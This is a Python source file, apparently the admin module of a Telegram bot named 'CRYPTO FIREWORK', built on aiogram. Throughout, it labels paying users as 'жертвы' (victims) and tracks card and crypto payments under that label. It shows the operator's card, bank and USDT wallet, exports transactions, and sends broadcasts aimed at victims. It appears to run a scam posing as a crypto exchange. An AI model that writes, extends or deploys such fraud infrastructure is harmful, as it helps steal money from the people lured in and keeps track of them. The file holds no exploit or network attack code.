from aiogram import Router, F, types
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder
from data.texts import *
from data.keyboards import *
from database.models import get_stats, get_transactions, get_users_list, ban_user, db, get_user
import os
from datetime import datetime

router = Router()
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "872151895,6593438966").split(",")]

def is_admin(uid): return uid in ADMIN_IDS

def admin_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="📊 СТАТИСТИКА", callback_data="admin_stats")
    builder.button(text="👥 ЮЗЕРЫ", callback_data="admin_users")
    builder.button(text="💰 ТРАНЗАКЦИИ", callback_data="admin_trans")
    builder.button(text="💎 ЖЕРТВЫ (RUB)", callback_data="admin_rub")
    builder.button(text="₿ ЖЕРТВЫ (CRYPTO)", callback_data="admin_crypto")
    builder.button(text="🚫 ЗАБАНЕННЫЕ", callback_data="admin_banned")
    builder.button(text="📢 РАССЫЛКА", callback_data="admin_broadcast")
    builder.button(text="🔍 ПОИСК ЮЗЕРА", callback_data="admin_search")
    builder.button(text="📋 ЭКСПОРТ", callback_data="admin_export")
    builder.button(text="⚙️ НАСТРОЙКИ", callback_data="admin_settings")
    builder.button(text="❌ ЗАКРЫТЬ", callback_data="close")
    builder.adjust(2, 2, 2, 2, 2, 1)
    return builder.as_markup()

def back_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="◀️ НАЗАД", callback_data="admin")
    return builder.as_markup()

@router.message(Command("admin"))
async def admin_panel(message: Message):
    if not is_admin(message.from_user.id): return
    s = get_stats()
    # Считаем жертв
    rub_victims = db.fetchone("SELECT COUNT(*) as c FROM transactions WHERE type='buy'")
    crypto_victims = db.fetchone("SELECT COUNT(*) as c FROM transactions WHERE type='sell'")
    
    await message.answer(
        f"👑 <b>CRYPTO FIREWORK ADMIN</b>\n\n"
        f"📊 <b>ОБЩАЯ СТАТИСТИКА:</b>\n"
        f"👥 Всего юзеров: {s['users']}\n"
        f"💰 Всего транзакций: {s['transactions']}\n"
        f"💵 Общий доход: {s['revenue']}₽\n\n"
        f"🎯 <b>ЖЕРТВЫ:</b>\n"
        f"💳 На карту: {rub_victims['c'] if rub_victims else 0}\n"
        f"₿ На крипту: {crypto_victims['c'] if crypto_victims else 0}",
        reply_markup=admin_keyboard()
    )

@router.callback_query(F.data == "admin")
async def admin_back(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    s = get_stats()
    rub_victims = db.fetchone("SELECT COUNT(*) as c FROM transactions WHERE type='buy'")
    crypto_victims = db.fetchone("SELECT COUNT(*) as c FROM transactions WHERE type='sell'")
    
    await call.message.edit_text(
        f"👑 <b>CRYPTO FIREWORK ADMIN</b>\n\n"
        f"📊 <b>ОБЩАЯ СТАТИСТИКА:</b>\n"
        f"👥 Всего юзеров: {s['users']}\n"
        f"💰 Всего транзакций: {s['transactions']}\n"
        f"💵 Общий доход: {s['revenue']}₽\n\n"
        f"🎯 <b>ЖЕРТВЫ:</b>\n"
        f"💳 На карту: {rub_victims['c'] if rub_victims else 0}\n"
        f"₿ На крипту: {crypto_victims['c'] if crypto_victims else 0}",
        reply_markup=admin_keyboard()
    )
    await call.answer()

# ==================== СТАТИСТИКА ====================
@router.callback_query(F.data == "admin_stats")
async def admin_stats(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    s = get_stats()
    rub = db.fetchone("SELECT COUNT(*) as c, COALESCE(SUM(amount),0) as total FROM transactions WHERE type='buy'")
    crypto = db.fetchone("SELECT COUNT(*) as c, COALESCE(SUM(amount),0) as total FROM transactions WHERE type='sell'")
    
    await call.message.edit_text(
        f"📊 <b>ПОЛНАЯ СТАТИСТИКА</b>\n\n"
        f"👥 Юзеров: {s['users']}\n"
        f"💰 Транзакций: {s['transactions']}\n"
        f"💵 Доход всего: {s['revenue']}₽\n\n"
        f"💳 <b>Жертвы на карту:</b>\n"
        f"• Количество: {rub['c'] if rub else 0}\n"
        f"• Сумма: {rub['total'] if rub else 0}₽\n\n"
        f"₿ <b>Жертвы на крипту:</b>\n"
        f"• Количество: {crypto['c'] if crypto else 0}\n"
        f"• Сумма: {crypto['total'] if crypto else 0}₽\n\n"
        f"📅 {datetime.now().strftime('%d.%m.%Y %H:%M')}",
        reply_markup=back_keyboard()
    )
    await call.answer()

# ==================== ЮЗЕРЫ ====================
@router.callback_query(F.data == "admin_users")
async def admin_users(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    users = get_users_list(50)
    text = "👥 <b>ПОСЛЕДНИЕ 50 ЮЗЕРОВ:</b>\n\n"
    for u in users:
        ban = "🚫" if u.get('banned') else "✅"
        spent = u.get('total_spent', 0)
        text += f"{ban} <code>{u['user_id']}</code> @{u.get('username','?')} | 💰{spent}₽\n"
    
    builder = InlineKeyboardBuilder()
    builder.button(text="📋 ВСЕ", callback_data="admin_users_all")
    builder.button(text="🚫 БАННУТЫЕ", callback_data="admin_banned")
    builder.button(text="◀️ НАЗАД", callback_data="admin")
    builder.adjust(2, 1)
    await call.message.edit_text(text, reply_markup=builder.as_markup())
    await call.answer()

@router.callback_query(F.data == "admin_users_all")
async def admin_users_all(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    users = db.fetchall("SELECT * FROM users ORDER BY joined_date DESC LIMIT 100")
    text = "👥 <b>ВСЕ ЮЗЕРЫ (100):</b>\n\n"
    for u in users:
        ban = "🚫" if u.get('banned') else "✅"
        text += f"{ban} <code>{u['user_id']}</code> | 💰{u.get('total_spent',0)}₽\n"
    await call.message.edit_text(text, reply_markup=back_keyboard())
    await call.answer()

# ==================== ТРАНЗАКЦИИ ====================
@router.callback_query(F.data == "admin_trans")
async def admin_trans(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    trans = get_transactions(50)
    if not trans: await call.message.edit_text("Нет транзакций.", reply_markup=back_keyboard()); return
    text = "💰 <b>ПОСЛЕДНИЕ 50 ТРАНЗАКЦИЙ:</b>\n\n"
    for t in trans:
        emoji = "💳" if t['type'] == 'buy' else "₿"
        text += f"#{t['id']} {emoji} <code>{t['user_id']}</code> | {t['amount']} {t['currency']} | {t['created_at'][:16]}\n"
    await call.message.edit_text(text, reply_markup=back_keyboard())
    await call.answer()

# ==================== ЖЕРТВЫ ====================
@router.callback_query(F.data == "admin_rub")
async def admin_rub(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    victims = db.fetchall("SELECT * FROM transactions WHERE type='buy' ORDER BY created_at DESC LIMIT 50")
    if not victims: await call.message.edit_text("Нет жертв на карту.", reply_markup=back_keyboard()); return
    text = "💳 <b>ЖЕРТВЫ НА КАРТУ:</b>\n\n"
    for v in victims:
        text += f"<code>{v['user_id']}</code> | {v['amount']}₽ | {v['created_at'][:16]}\n"
    await call.message.edit_text(text, reply_markup=back_keyboard())
    await call.answer()

@router.callback_query(F.data == "admin_crypto")
async def admin_crypto(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    victims = db.fetchall("SELECT * FROM transactions WHERE type='sell' ORDER BY created_at DESC LIMIT 50")
    if not victims: await call.message.edit_text("Нет жертв на крипту.", reply_markup=back_keyboard()); return
    text = "₿ <b>ЖЕРТВЫ НА КРИПТУ:</b>\n\n"
    for v in victims:
        text += f"<code>{v['user_id']}</code> | {v['amount']}₽ | {v['wallet']} | {v['created_at'][:16]}\n"
    await call.message.edit_text(text, reply_markup=back_keyboard())
    await call.answer()

# ==================== ЗАБАНЕННЫЕ ====================
@router.callback_query(F.data == "admin_banned")
async def admin_banned(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    banned = db.fetchall("SELECT * FROM users WHERE banned=1 ORDER BY joined_date DESC LIMIT 50")
    if not banned: await call.message.edit_text("Нет забаненных.", reply_markup=back_keyboard()); return
    text = "🚫 <b>ЗАБАНЕННЫЕ:</b>\n\n"
    builder = InlineKeyboardBuilder()
    for b in banned:
        text += f"<code>{b['user_id']}</code> | {b.get('ban_reason','?')}\n"
        builder.button(text=f"✅ Разбан {b['user_id']}", callback_data=f"unban_{b['user_id']}")
    builder.button(text="◀️ НАЗАД", callback_data="admin")
    builder.adjust(1)
    await call.message.edit_text(text, reply_markup=builder.as_markup())
    await call.answer()

@router.callback_query(F.data.startswith("unban_"))
async def unban_user_callback(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    uid = int(call.data.split("_")[1])
    db.update('users', {'banned': 0, 'ban_reason': ''}, 'user_id=?', (uid,))
    await call.message.edit_text(call.message.text + f"\n\n✅ {uid} разбанен!")
    await call.answer("✅ Разбанен!")

# ==================== ПОИСК ====================
@router.callback_query(F.data == "admin_search")
async def admin_search(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    await call.message.edit_text(
        "🔍 <b>ПОИСК ЮЗЕРА</b>\n\n"
        "Отправьте команду:\n"
        "<code>/find ID</code> — поиск по ID\n"
        "<code>/find @username</code> — поиск по юзернейму",
        reply_markup=back_keyboard()
    )
    await call.answer()

@router.message(Command("find"))
async def find_user(message: Message):
    if not is_admin(message.from_user.id): return
    query = message.text.replace("/find ", "").strip()
    if not query: await message.answer("/find ID или @username"); return
    
    if query.startswith("@"):
        user = db.fetchone("SELECT * FROM users WHERE username=?", (query[1:],))
    else:
        try:
            user = db.fetchone("SELECT * FROM users WHERE user_id=?", (int(query),))
        except:
            await message.answer("❌ Неверный формат!"); return
    
    if not user:
        await message.answer("❌ Юзер не найден.")
        return
    
    trans = db.fetchall("SELECT * FROM transactions WHERE user_id=? ORDER BY created_at DESC LIMIT 10", (user['user_id'],))
    text = f"👤 <b>ИНФО О ЮЗЕРЕ</b>\n\n"
    text += f"🆔 ID: <code>{user['user_id']}</code>\n"
    text += f"👤 @{user.get('username','?')}\n"
    text += f"📅 С нами с: {user.get('joined_date','')[:10]}\n"
    text += f"💵 Потратил: {user.get('total_spent',0)}₽\n"
    text += f"🚫 Забанен: {'Да' if user.get('banned') else 'Нет'}\n\n"
    text += f"💰 <b>Последние транзакции:</b>\n"
    for t in trans:
        text += f"#{t['id']} | {t['type']} | {t['amount']}{t['currency']}\n"
    
    builder = InlineKeyboardBuilder()
    if user.get('banned'):
        builder.button(text="✅ РАЗБАНИТЬ", callback_data=f"unban_{user['user_id']}")
    else:
        builder.button(text="🚫 ЗАБАНИТЬ", callback_data=f"bannow_{user['user_id']}")
    builder.button(text="◀️ НАЗАД", callback_data="admin")
    builder.adjust(1)
    await message.answer(text, reply_markup=builder.as_markup())

@router.callback_query(F.data.startswith("bannow_"))
async def bannow(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    uid = int(call.data.split("_")[1])
    ban_user(uid, "Ручной бан")
    await call.message.edit_text(call.message.text + "\n\n🚫 Забанен!")
    await call.answer("🚫 Забанен!")

# ==================== ЭКСПОРТ ====================
@router.callback_query(F.data == "admin_export")
async def admin_export(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    trans = db.fetchall("SELECT * FROM transactions ORDER BY created_at DESC")
    if not trans:
        await call.message.edit_text("Нет данных для экспорта.", reply_markup=back_keyboard())
        return
    
    text = "💰 ЭКСПОРТ ТРАНЗАКЦИЙ\n\n"
    for t in trans:
        text += f"#{t['id']};{t['user_id']};{t['type']};{t['amount']};{t['currency']};{t['wallet']};{t['created_at']}\n"
    
    # Отправляем как файл
    from io import BytesIO
    file = BytesIO(text.encode('utf-8'))
    file.name = "transactions.csv"
    await call.message.answer_document(types.BufferedInputFile(file.read(), "transactions.csv"), caption="📋 Экспорт транзакций")
    await call.answer("✅ Экспортировано!")

# ==================== НАСТРОЙКИ ====================
@router.callback_query(F.data == "admin_settings")
async def admin_settings(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    await call.message.edit_text(
        f"⚙️ <b>НАСТРОЙКИ</b>\n\n"
        f"💳 Карта: <code>{CARD}</code>\n"
        f"🏦 Банк: {BANK}\n"
        f"💰 USDT: <code>{USDT_WALLET}</code>\n"
        f"📞 Саппорт: {SUPPORT_URL}\n\n"
        f"Для смены реквизитов — измени .env на Render",
        reply_markup=back_keyboard()
    )
    await call.answer()

# ==================== РАССЫЛКА ====================
@router.callback_query(F.data == "admin_broadcast")
async def admin_broadcast(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    await call.message.edit_text(
        "📢 <b>РАССЫЛКА</b>\n\n"
        "<code>/bc ВСЕМ ТЕКСТ</code> — всем\n"
        "<code>/bc_active ТЕКСТ</code> — только активным\n"
        "<code>/bc_victims ТЕКСТ</code> — жертвам",
        reply_markup=back_keyboard()
    )
    await call.answer()

@router.message(Command("bc"))
async def broadcast(message: Message):
    if not is_admin(message.from_user.id): return
    parts = message.text.split(" ", 2)
    target = "all"
    if len(parts) >= 2 and parts[1] in ["active", "victims"]:
        target = parts[1]
        text = parts[2] if len(parts) > 2 else ""
    else:
        text = message.text.replace("/bc ", "", 1)
    
    if not text or text == "/bc": await message.answer("❌ Укажите текст!"); return
    
    if target == "active":
        users = db.fetchall("SELECT user_id FROM users WHERE banned=0")
    elif target == "victims":
        users = db.fetchall("SELECT DISTINCT user_id FROM transactions")
    else:
        users = db.fetchall("SELECT user_id FROM users")
    
    sent = 0
    for u in users:
        try: await message.bot.send_message(u['user_id'], f"📢 {text}"); sent += 1
        except: pass
    await message.answer(f"✅ Отправлено: {sent}/{len(users)}")

@router.message(Command("unban"))
async def unban_cmd(message: Message):
    if not is_admin(message.from_user.id): return
    args = message.text.split()
    if len(args) < 2: return
    uid = int(args[1])
    db.update('users', {'banned': 0, 'ban_reason': ''}, 'user_id=?', (uid,))
    await message.answer(f"✅ {uid} разбанен!")

@router.callback_query(F.data == "close")
async def close(call: CallbackQuery): await call.message.delete(); await call.answer()
